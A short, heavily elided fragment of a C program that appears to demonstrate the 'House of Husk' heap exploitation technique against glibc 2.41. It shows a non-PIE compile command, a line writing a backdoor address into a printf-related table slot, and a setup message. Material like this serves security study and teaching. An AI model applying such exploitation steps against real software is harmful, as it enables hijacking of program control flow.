 ...
 * 
 * Compile : gcc -no-pie -fno-PIE -O0 -g -o house_of_husk_1_glibc-2.41 house_of_husk_1_glibc-2.41.c
 */
...
int main(void)
{
  ...
  *(size_t *)(p4 + ('X' - 2)) = backdoor_addr;
  ...
  puts("[*] Setup complete for House of Husk (Attack Chain 1) in glibc-2.41");
